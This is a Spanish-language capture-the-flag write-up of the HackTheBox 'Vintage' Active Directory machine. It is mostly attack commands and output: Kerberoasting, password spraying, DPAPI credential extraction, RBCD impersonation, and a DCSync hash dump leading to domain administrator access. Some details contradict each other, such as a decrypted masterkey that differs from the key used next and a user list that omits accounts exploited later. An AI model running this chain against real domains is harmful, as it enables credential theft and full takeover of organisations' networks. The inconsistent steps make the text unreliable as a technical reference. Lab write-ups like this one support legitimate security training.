---
title: "HTB: Vintage"
date: 2026-04-17 12:00:00 +0000
categories: [WriteUp, HackTheBox]
tags: [Active Directory, Windows, Kerberos, GMSA, Kerberoasting, PRE2k, RBCD, DPAPI, DCSync]
image:
  path: /assets/img/vintage/Vintage-HTB.png
  alt: HackTheBox Vintage Machine
  width: 500
  height: 280
  class: sz-contain
---

## Introducción

**Vintage** es una máquina de **HackTheBox** enfocada en entornos de **Active Directory**.
La particularidad de este entorno es que la autenticación **NTLM está completamente deshabilitada**,
por lo que todos los ataques deberán realizarse mediante tickets **Kerberos**. El acceso inicial
se obtiene abusando del grupo **Pre-Windows 2000 Compatible Access**, que expone credenciales
predecibles de equipos del dominio. A partir de ahí, se encadena una serie de abusos de **ACLs**:
lectura de contraseña **GMSA**, adición al grupo **ServiceManagers** y explotación de permisos
**GenericAll** para habilitar una cuenta de servicio deshabilitada y realizar **Kerberoasting**.
Con las credenciales obtenidas se accede al sistema, se descifran credenciales almacenadas
mediante **DPAPI** y finalmente se abusa de **Resource-Based Constrained Delegation (RBCD)**
para impersonar a un administrador del dominio y ejecutar un **DCSync**.

### Cadena de ataque

```
P.Rosa (creds iniciales)
    │
    ▼
PRE2k → FS01$ (contraseña predecible)
    │
    ▼
ReadGMSAPassword → gMSA01$ (hash NTLM)
    │
    ▼
AddSelf → grupo ServiceManagers
    │
    ▼
GenericAll → habilitar SVC_SQL + asignar SPN
    │
    ▼
Kerberoasting → hash TGS → contraseña Zer0the0ne
    │
    ▼
Password Spray → C.Neri (WinRM)
    │
    ▼
DPAPI → credenciales C.Neri_adm
    │
    ▼
RBCD + S4U2Proxy → impersonar L.Bianchi_adm
    │
    ▼
DCSync → hash Administrator → SYSTEM
```

---

## Reconocimiento

### Comprobación de conectividad

```bash
ping -c 1 10.129.20.217
```

```
64 bytes from 10.129.20.217: icmp_seq=1 ttl=127 time=116 ms
```

### Escaneo de Puertos

```bash
rustscan -a $IP --ulimit 1000 -r 1-65535 -- -A -sC -sV -Pn -o nmapresult.txt
```

**Resultados relevantes:**

| Puerto | Estado | Servicio                  |
|--------|--------|---------------------------|
| 53     | open   | Simple DNS Plus           |
| 88     | open   | Kerberos                  |
| 135    | open   | MS RPC                    |
| 389    | open   | LDAP (AD)                 |
| 445    | open   | SMB                       |
| 464    | open   | Kpasswd5                  |
| 593    | open   | RPC over HTTP             |
| 636    | open   | LDAPS                     |
| 3268   | open   | LDAP Global Catalog       |
| 3269   | open   | LDAPS Global Catalog      |
| 5985   | open   | WinRM (HTTP)              |
| 9389   | open   | .NET Message Framing      |

### Análisis del escaneo

Los puertos habituales de **Active Directory** confirman que el host es un **Controlador de Dominio** del entorno `vintage.htb`.

**Observaciones clave:**

- **NTLM deshabilitado:** No hay forma de autenticarse con usuario:contraseña directamente contra SMB/LDAP de forma estándar. Todos los ataques deberán usar tickets Kerberos obtenidos previamente con `kinit` o herramientas de Impacket.
- **Firma SMB obligatoria:** Descarta ataques de relay NTLM como Responder + ntlmrelayx.
- **WinRM en 5985:** Permite acceso remoto con credenciales válidas vía `evil-winrm`.
- **Desfase horario crítico:** Kerberos requiere que la diferencia de hora entre cliente y KDC sea menor a 5 minutos. Si hay skew, los tickets serán rechazados con `KRB_AP_ERR_SKEW`. Sincronizar con `sudo ntpdate -u $IP` antes de cualquier ataque Kerberos.

---

## Enumeración inicial (NXC)

Reutilizaremos las credenciales filtradas por el creador de la máquina para realizar una enumeración autenticada.

### NTLM deshabilitado

Al intentar autenticación estándar, el servidor la rechaza:

```bash
nxc smb $IP -u 'P.Rosa' -p 'Rosaisbest123' --users
```

```
SMB  10.129.20.217  445  dc01  [*] x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB  10.129.20.217  445  dc01  [-] vintage.htb\P.Rosa:Rosaisbest123 STATUS_NOT_SUPPORTED
```

> `STATUS_NOT_SUPPORTED` indica que el servidor rechazó el método de autenticación NTLM. Para operar en este entorno es obligatorio usar Kerberos.

Obtenemos el TGT de `P.Rosa` directamente con `kinit`, que solicita un **Ticket Granting Ticket** al KDC usando las credenciales en texto claro:

```bash
kinit P.rosa@VINTAGE.HTB
```

A partir de aquí, NXC usará la caché de tickets Kerberos (`KRB5CCNAME`) con el flag `-k` en lugar de enviar credenciales NTLM.

### Enumeración de usuarios

```bash
nxc smb $IP -u 'P.Rosa' -p 'Rosaisbest123' -k --users
```

```
SMB  10.129.20.217  445  dc01  [+] vintage.htb\P.Rosa:Rosaisbest123
SMB  10.129.20.217  445  dc01  Administrator   2025-04-17 15:45:01 0
SMB  10.129.20.217  445  dc01  Guest           <never>             0
SMB  10.129.20.217  445  dc01  krbtgt          2025-04-17 16:00:02 0
SMB  10.129.20.217  445  dc01  ca_svc          2025-04-17 16:07:50 0
SMB  10.129.20.217  445  dc01  ldap_svc        2025-04-17 16:17:00 0
SMB  10.129.20.217  445  dc01  p.agila         2025-04-18 14:37:08 0
SMB  10.129.20.217  445  dc01  winrm_svc       2025-05-18 00:51:16 0
SMB  10.129.20.217  445  dc01  j.coffey        2025-04-19 12:09:55 0
SMB  10.129.20.217  445  dc01  j.fleischman    2025-05-16 14:46:55 0
```

### Enumeración de recursos compartidos

```bash
nxc smb $IP -u 'P.Rosa' -p 'Rosaisbest123' -k --shares
```

Los resultados muestran los recursos predeterminados de AD (`ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL`), sin recursos no estándar de interés inmediato.

---

## Análisis de Dominio — BloodHound

```bash
bloodhound-ce-python -u 'P.Rosa' -p 'Rosaisbest123' -d vintage.htb -ns $IP -c All --zip
```

BloodHound recopila todos los objetos del dominio (usuarios, grupos, GPOs, ACLs, sesiones, delegaciones) y construye un grafo de relaciones que permite identificar rutas de ataque que serían invisibles analizando objetos individualmente.

---

## PRE2k — Credenciales predecibles en cuentas de equipo

### ¿Qué es Pre-Windows 2000 Compatible Access?

Es un grupo heredado de Active Directory que existe por compatibilidad con sistemas anteriores a Windows 2000. Su presencia no es el problema en sí — el problema real es el **proceso de unión al dominio** que usaron para agregar ciertas cuentas de equipo.

Cuando un equipo se une al dominio con la opción **"Assign this computer account as a pre-Windows 2000 computer"**, Active Directory establece la contraseña de la cuenta de equipo como **el nombre del host en minúsculas** (sin el `$`). Esto es un comportamiento documentado desde la era de NT4, y muchos administradores lo desconocen o lo olvidan.

**¿Por qué es explotable?**

Las cuentas de equipo (`MACHINE$`) son cuentas de AD completamente funcionales. Pueden autenticarse, obtener TGTs, acceder a recursos y —lo más importante para nosotros— tienen membresías de grupo y permisos sobre otros objetos del dominio. Si la contraseña es predecible, es equivalente a tener credenciales válidas.

**Diferencia clave con otros ataques:** No hay bruteforce, no hay tráfico de red sospechoso. Es simplemente conocer la convención de nomenclatura que usó el administrador.

BloodHound revela que el grupo **Pre-Windows 2000 Compatible Access** está presente y que `FS01$` fue creada con esta configuración. Probamos la contraseña predecible:

```bash
nxc smb $IP -u 'fs01$' -p 'fs01' -k
```

```
SMB  10.129.20.217  445  dc01  [+] vintage.htb\fs01$:fs01
```

> La cuenta de equipo `FS01$` usa su nombre en minúsculas como contraseña. Tenemos credenciales válidas.

---

## ReadGMSAPassword — De FS01$ a gMSA01$

### ¿Qué es una cuenta GMSA?

Una **Group Managed Service Account (gMSA)** es un tipo especial de cuenta de servicio en Active Directory diseñada para que las contraseñas sean gestionadas automáticamente por el propio AD. La contraseña tiene 256 bytes aleatorios y rota automáticamente cada 30 días. Ningún humano la conoce — la obtienen programáticamente las entidades autorizadas.

**¿Cómo funciona la autorización?**

El atributo `msDS-GroupMSAMembership` de la cuenta gMSA define qué principals (usuarios, grupos, equipos) tienen permiso para **leer la contraseña**. Esto se controla a nivel de ACL en el directorio.

**¿Qué pasa si tenemos `ReadGMSAPassword`?**

Podemos consultar el atributo `msDS-ManagedPassword` de la cuenta gMSA vía LDAP y obtener el hash NTLM actual. Esto equivale a conocer la contraseña sin necesidad de crackearla — podemos hacer Pass-the-Hash directamente (o en este caso, usar el hash para obtener un TGT con `-hashes`).

BloodHound muestra que `FS01$` es miembro del grupo **Domain Computers**, y este grupo tiene `ReadGMSAPassword` sobre `gMSA01$`:

![ReadGMSA](/assets/img/vintage/Readgmspassword.png)

```bash
nxc ldap $IP -u 'fs01$' -p 'fs01' -k --gmsa
```

```
LDAP  10.129.20.217  389  DC01  [+] vintage.htb\fs01$:fs01
LDAP  10.129.20.217  389  DC01  [*] Getting GMSA Passwords
LDAP  10.129.20.217  389  DC01  Account: gMSA01$   NTLM: 0851299c01b944d01099fc977eaa6c67
```

> Tenemos el hash NTLM de `gMSA01$`. Aunque no podemos crackearlo (es aleatorio), podemos usarlo directamente con Impacket para obtener un TGT Kerberos.

---

## AddSelf — De gMSA01$ a ServiceManagers

### ¿Qué es el permiso AddSelf?

`AddSelf` es un permiso de ACL en Active Directory que permite a un principal **añadirse a sí mismo** como miembro de un grupo, sin necesidad de tener permisos de administración sobre el grupo. Es diferente de `AddMember` (que permite añadir a cualquier otro objeto).

**¿Por qué es relevante?**

En una auditoría normal este permiso puede parecer inofensivo — "solo se añade a sí mismo". Pero en el contexto de un ataque encadenado, si el grupo al que puede unirse tiene permisos privilegiados sobre otros objetos del dominio, `AddSelf` se convierte en el escalón que abre la siguiente puerta.

BloodHound muestra que `gMSA01$` tiene `AddSelf` sobre **ServiceManagers**:

![AddSelf](/assets/img/vintage/addself.png)

Antes de ejecutar el ataque necesitamos un TGT de `gMSA01$`. Como NTLM está deshabilitado, usamos el hash para pedir el ticket directamente al KDC:

```bash
getTGT.py vintage.htb/gMSA01\$ -hashes :0851299c01b944d01099fc977eaa6c67 -dc-ip $IP
export KRB5CCNAME=$(pwd)/gMSA01\$.ccache
```

```bash
bloodyAD --host dc01.vintage.htb --dc-ip $IP -d vintage.htb -u 'gMSA01$' -k add groupMember SERVICEMANAGERS 'gMSA01$'
```

```
[+] gMSA01$ added to SERVICEMANAGERS
```

---

## GenericAll y Kerberoasting — De ServiceManagers a SVC_SQL

### ¿Qué es el permiso GenericAll?

`GenericAll` es el permiso más amplio en las ACLs de Active Directory. Equivale a **control total** sobre el objeto — el titular puede modificar cualquier atributo, cambiar la contraseña, añadir SPNs, desactivar/activar la cuenta, etc.

Cuando `GenericAll` apunta a una **cuenta de usuario**, abre múltiples vectores:
- **Targeted Kerberoasting:** asignar un SPN falso y solicitar un TGS crackeable.
- **Shadow Credentials:** escribir en `msDS-KeyCredentialLink` para obtener un certificado.
- **Force Password Change:** cambiar la contraseña directamente (ruidoso).

### ¿Qué es Kerberoasting y por qué funciona?

Cuando un usuario solicita acceso a un servicio identificado por un **SPN** (Service Principal Name), el KDC emite un **Ticket de Servicio (TGS)** cifrado con el hash NTLM de la cuenta que tiene ese SPN registrado.

El punto crítico: **cualquier usuario autenticado en el dominio puede solicitar este TGS**. No necesitas ser administrador. El KDC simplemente emite el ticket sin verificar si realmente vas a usar ese servicio.

El TGS está cifrado con RC4 (o AES si la cuenta lo soporta), y podemos intentar craquearlo offline sin hacer ruido adicional en la red. Si la contraseña de la cuenta de servicio es débil, la obtenemos.

**¿Por qué SVC_SQL estaba deshabilitada?**

Las cuentas deshabilitadas no pueden recibir TGS. Por eso el primer paso es habilitarla usando `GenericAll`, luego asignarle un SPN falso y finalmente realizar el Kerberoasting.

BloodHound revela que **ServiceManagers** tiene `GenericAll` sobre varios usuarios de servicio:

![GenericAll](/assets/img/vintage/genericall.png)

### 1. Habilitar SVC_SQL

El atributo `userAccountControl` con valor `512` corresponde a una cuenta de usuario normal y habilitada. El valor `514` es la misma cuenta pero deshabilitada. Cambiamos a `512`:

```bash
bloodyAD --host dc01.vintage.htb --dc-ip $IP -d vintage.htb -u 'gMSA01$' -k set object SVC_SQL userAccountControl -v 512
```

```
[+] SVC_SQL's userAccountControl has been updated
```

### 2. Asignar un SPN falso

Para que el KDC emita un TGS para `SVC_SQL`, la cuenta necesita tener un SPN registrado. Asignamos uno arbitrario:

```bash
bloodyAD --host dc01.vintage.htb --dc-ip $IP -d vintage.htb -u 'gMSA01$' -k set object SVC_SQL servicePrincipalName -v 'MSSQLSvc/d0c1.vintage.htb'
```

```
[+] SVC_SQL's servicePrincipalName has been updated
```

### 3. Kerberoasting

Solicitamos el TGS para todos los SPNs del dominio usando nuestra caché de tickets actual:

```bash
nxc ldap dc01.vintage.htb -k --use-kcache --kerberoasting hashes.kerberoast
```

```
LDAP  dc01.vintage.htb 389  DC01  [+] VINTAGE.HTB\gMSA01$ from ccache
LDAP  dc01.vintage.htb 389  DC01  [*] sAMAccountName: svc_sql
LDAP  dc01.vintage.htb 389  DC01  $krb5tgs$23$*svc_sql$VINTAGE.HTB$...<hash>...
```

### 4. Crackeo offline con Hashcat

El tipo `-m 13100` corresponde a TGS-REP (Kerberos 5 TGS-REP etype 23, RC4):

```bash
hashcat -a 0 -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt
```

**Contraseña obtenida:** `Zer0the0ne`

---

## Movimiento Lateral — Password Spray con Kerberos

Con la contraseña obtenida del Kerberoasting, realizamos un **Password Spray** contra todos los usuarios del dominio. A diferencia de un bruteforce (muchas contraseñas contra un usuario), el spray prueba **una sola contraseña contra muchos usuarios**, lo que reduce enormemente el riesgo de bloqueo de cuentas.

```bash
nxc ldap $IP -u users.txt -p Zer0the0ne --continue-on-success -k
```

```
LDAP  10.129.20.217  389  DC01  [+] vintage.htb\C.Neri:Zer0the0ne
LDAP  10.129.20.217  389  DC01  [+] vintage.htb\svc_sql:Zer0the0ne
```

`C.Neri` reutilizó la contraseña de `SVC_SQL`. Esto es un error de seguridad común en entornos donde los administradores comparten o sincronizan contraseñas entre cuentas.

---

## Acceso Inicial — Evil-WinRM como C.Neri

```bash
kinit C.Neri@VINTAGE.HTB
export KRB5CCNAME=$(pwd)/C.Neri.ccache
evil-winrm -i dc01.vintage.htb -r vintage.htb -u C.Neri
```

```powershell
*Evil-WinRM* PS C:\Users\C.Neri> type Desktop\user.txt
958c329b9918249ded7911fbf11e1ab9
```

---

## Escalada de Privilegios — DPAPI Credential Extraction

### ¿Qué es DPAPI?

**Data Protection API (DPAPI)** es un sistema de cifrado de Windows diseñado para que las aplicaciones puedan almacenar secretos (contraseñas, tokens, claves) de forma segura sin tener que gestionar las claves de cifrado ellas mismas. El sistema operativo se encarga de todo.

**¿Cómo funciona internamente?**

El flujo de cifrado/descifrado de DPAPI funciona así:

```
Contraseña del usuario
        │
        ▼
  PBKDF2 / SHA1
        │
        ▼
   Masterkey (cifrada con la contraseña del usuario)
        │  almacenada en:
        │  %APPDATA%\Microsoft\Protect\{SID}\{GUID}
        ▼
   Blob cifrado (credencial, cookie, etc.)
        │  almacenado en:
        │  %APPDATA%\Microsoft\Credentials\{GUID}
        ▼
   Dato en claro (solo accesible con la Masterkey)
```

La **Masterkey** es la clave maestra que descifra todos los blobs. Está protegida por la contraseña del usuario (y opcionalmente por la contraseña del dominio a través del DPAPI backup del DC). Para descifrar cualquier dato protegido por DPAPI necesitamos:
1. El archivo de Masterkey del usuario.
2. La contraseña del usuario (o acceso al DC para usar el backup de dominio).
3. El SID del usuario (para identificar la Masterkey correcta).

**¿Por qué es poderoso desde perspectiva ofensiva?**

Windows y muchas aplicaciones almacenan credenciales con DPAPI por defecto: credenciales del Administrador de credenciales de Windows, cookies de navegadores, contraseñas de VPN, certificados privados, etc. Una vez comprometida una cuenta, DPAPI puede revelar credenciales de otras cuentas almacenadas en ese perfil.

### Extracción de archivos

Buscamos los archivos relevantes en el perfil de `C.Neri`:

```powershell
# Blobs de credenciales (datos cifrados)
ls C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\ -Force
ls C:\Users\C.Neri\AppData\Local\Microsoft\Credentials\ -Force

# Masterkeys (claves maestras cifradas con la contraseña del usuario)
ls "C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\" -Force
```

Exportamos en Base64 para transferirlos a nuestra máquina sin corromperlos:

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\C4BB96844A5C9DD45D5B6A9859252BA6"))
```

```bash
echo "<BASE64_MASTERKEY>" | base64 -d > masterkey2
echo "<BASE64_BLOB>"      | base64 -d > blob_roaming
```

### Descifrado de la Masterkey

Usamos la contraseña conocida de `C.Neri` (`Zer0the0ne`) junto con su SID para descifrar la Masterkey:

```bash
dpapi.py masterkey -file masterkey2 -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password 'Zer0the0ne'
```

```
Decrypted key with User Key (MD4 protected)
Decrypted key: 0x55d51b40d9aa74e8cdc44a6d24a25c96451449229739a1c9dd2bb50048b60a65...
```

### Descifrado del blob de credenciales

Con la Masterkey en claro, desciframos el blob que contiene la credencial almacenada:

```bash
dpapi.py credential -file blob_roaming -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b...
```

```
[CREDENTIAL]
LastWritten : 2024-06-07 15:08:23
Target      : LegacyGeneric:target=admin_acc
Username    : vintage\c.neri_adm
Password    : Uncr4ck4bl3P4ssW0rd0312
```

> `C.Neri` tenía almacenada en su perfil la contraseña de su cuenta administrativa `C.Neri_adm`. DPAPI la protegía, pero nosotros ya teníamos la contraseña del usuario para descifrarla.

---

## RBCD + S4U2Proxy + DCSync

### ¿Qué es Resource-Based Constrained Delegation (RBCD)?

La **delegación de Kerberos** permite que un servicio actúe **en nombre de un usuario** para acceder a otros servicios. Esto es necesario en arquitecturas de múltiples capas (ej: un servidor web que consulta una base de datos con la identidad del usuario que hizo la petición HTTP).

Existen tres tipos de delegación en AD:

| Tipo | Configuración | Control |
|------|--------------|---------|
| Unconstrained | En el objeto delegador | Administrador del dominio |
| Constrained (KCD) | En el objeto delegador | Administrador del dominio |
| Resource-Based (RBCD) | En el objeto **destino** | Propietario del recurso destino |

**RBCD es diferente porque el control está en el destino, no en el origen.** El atributo `msDS-AllowedToActOnBehalfOfOtherIdentity` del objeto destino define qué cuentas pueden delegar hacia él. Si podemos escribir ese atributo en un objeto, controlamos quién puede impersonar usuarios hacia ese objeto.

### ¿Cómo funciona el ataque?

Para explotar RBCD necesitamos:

1. **Una cuenta con SPN** (puede ser cualquier machine account o cuenta de servicio).
2. **Permiso de escritura** sobre el atributo `msDS-AllowedToActOnBehalfOfOtherIdentity` del objeto destino (en este caso, `DC01`).

El flujo del ataque usa dos extensiones de Kerberos:

```
Atacante (FS01$)
    │
    │ 1. S4U2Self: solicita un TGS para sí mismo EN NOMBRE de L.Bianchi_adm
    │    (el KDC lo permite porque FS01$ está en msDS-AllowedToActOnBehalf del DC)
    ▼
   KDC
    │
    │ 2. TGS para L.Bianchi_adm → FS01$ (marcado como forwardable)
    ▼
Atacante (FS01$)
    │
    │ 3. S4U2Proxy: usa ese TGS para solicitar acceso al servicio LDAP del DC
    │    en nombre de L.Bianchi_adm
    ▼
   KDC
    │
    │ 4. TGS para ldap/dc01.vintage.htb en nombre de L.Bianchi_adm
    ▼
Atacante
    │
    │ 5. Usa el TGS para conectarse como L.Bianchi_adm → DCSync
    ▼
   DC01
```

### ¿Por qué S4U2Self + `-force-forwardable`?

Normalmente, `S4U2Self` solo produce tickets forwardable si la cuenta solicitante tiene **Trusted to Authenticate for Delegation** configurado. Con `-force-forwardable` de Impacket forzamos que el ticket sea marcado como forwardable independientemente, lo que permite usarlo en el paso S4U2Proxy.

### ¿Por qué usamos FS01$ y no otra cuenta?

Porque el ataque requiere una cuenta con **SPN existente**. Las machine accounts tienen SPNs registrados automáticamente (HOST, TERMSRV, etc.), y `FS01$` tiene una contraseña conocida. No necesitamos crear una cuenta nueva.

BloodHound confirma que `DELEGATEDADMINS` tiene `AllowedToAct` sobre `DC01$`, y `C.Neri_adm` puede añadir miembros a ese grupo:

![RBCD](/assets/img/vintage/rbcd.png)

### 1. Obtener TGT de C.Neri_adm

```bash
getTGT.py vintage.htb/C.Neri_adm:'Uncr4ck4bl3P4ssW0rd0312' -dc-ip $IP
export KRB5CCNAME=$(pwd)/C.Neri_adm.ccache
```

### 2. Añadir FS01$ al grupo DELEGATEDADMINS

Con esto, `FS01$` queda autorizada en el atributo `msDS-AllowedToActOnBehalfOfOtherIdentity` de `DC01$`:

```bash
bloodyAD --host dc01.vintage.htb --dc-ip $IP -d vintage.htb -u 'C.Neri_adm' -k add groupMember DELEGATEDADMINS 'fs01$'
```

```
[+] fs01$ added to DELEGATEDADMINS
```

### 3. Obtener TGT fresco de FS01$

```bash
getTGT.py vintage.htb/'fs01$':'fs01' -dc-ip $IP
export KRB5CCNAME=$(pwd)/fs01\$.ccache
```

### 4. S4U2Self + S4U2Proxy — Impersonar L.Bianchi_adm

```bash
getST.py vintage.htb/'fs01$':'fs01' -spn ldap/dc01.vintage.htb -impersonate L.Bianchi_adm -force-forwardable -dc-ip $IP
```

```
[*] Impersonating L.Bianchi_adm
[*] Requesting S4U2self
[*] Forcing the service ticket to be forwardable
[*] Requesting S4U2Proxy
[*] Saving ticket in L.Bianchi_adm.ccache
```

### 5. DCSync — Volcar todos los hashes del dominio

**DCSync** abusa del protocolo de replicación de Active Directory (**MS-DRSR**). Los Controladores de Dominio se replican entre sí constantemente para mantener consistencia. El proceso incluye sincronizar los hashes de contraseñas de todos los objetos.

Si una cuenta tiene los permisos `DS-Replication-Get-Changes` y `DS-Replication-Get-Changes-All` sobre el objeto de dominio, puede **solicitar al DC que le envíe los datos de replicación**, incluyendo los hashes NTLM de todos los usuarios. Esto es lo que hacen los DCs legítimamente entre sí, y es exactamente lo que simulamos con `secretsdump.py`.

`L.Bianchi_adm` tiene estos permisos por ser miembro de un grupo privilegiado del dominio:

```bash
export KRB5CCNAME=$(pwd)/L.Bianchi_adm.ccache

secretsdump.py -k -no-pass vintage.htb/L.Bianchi_adm@dc01.vintage.htb
```

**NT Hash del Administrador:** `e41bb21e027286b2e6fd41de81bce8db`

---

## Acceso Final como Administrador

Con el hash del Administrador realizamos Pass-the-Hash a través de WMI:

```bash
wmiexec.py -k -no-pass vintage.htb/L.Bianchi_adm@dc01.vintage.htb \
  "type C:\Users\Administrator\Desktop\root.txt"
```

```
[*] SMBv3.0 dialect used
7886a19eb4bbf7dc3880aa271792cd61
```

**¡Máquina comprometida con éxito!**
